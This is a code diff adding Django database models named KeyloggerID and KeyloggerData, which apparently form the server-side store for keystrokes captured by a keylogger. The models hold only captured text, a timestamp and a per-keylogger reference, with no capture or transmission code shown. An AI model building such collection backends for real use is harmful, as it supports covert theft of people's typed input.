@@ -1,3 +1,22 @@
 from django.db import models
+import time
 
-# Create your models here.
+class KeyloggerID(models.Model):
+    def __str__(self):
+        return str(self.pk)
+
+    class Meta():
+        verbose_name = 'Keylogger Id'
+
+class KeyloggerData(models.Model):
+    data = models.CharField(max_length=1000, verbose_name='Data')
+    date = models.DateTimeField(verbose_name='Date')
+    keylogger_ref = models.ForeignKey(KeyloggerID,on_delete=models.CASCADE)
+
+    def __str__(self):
+        return str(self.data)
+
+    class Meta:
+        verbose_name = 'Keylogger data'
+        verbose_name_plural = 'Keyloger data'
+        
